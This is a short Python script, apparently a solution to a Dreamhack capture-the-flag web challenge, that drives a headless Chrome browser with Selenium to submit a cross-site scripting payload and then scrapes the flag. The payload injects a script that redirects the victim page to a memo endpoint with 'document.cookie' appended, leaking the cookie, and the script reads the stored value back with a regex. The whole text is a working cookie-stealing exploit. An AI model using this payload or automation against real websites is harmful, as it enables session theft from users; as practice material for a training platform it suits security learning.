from selenium import webdriver
from selenium.webdriver.common.by import By
import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

options = webdriver.ChromeOptions()
options.add_argument("headless")  # 백그라운드 실행
driver = webdriver.Chrome(options=options)
driver.get(f"{HOST}:{PORT}/flag")
driver.find_element(By.NAME, "param").send_keys(
    "<script>document.location.href = `/memo?memo=${document.cookie}`;</script>"
)
driver.find_element(By.CSS_SELECTOR, "body > div > form > input[type=submit]").click()
driver.quit()

res = requests.get(f"{HOST}:{PORT}/memo")
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
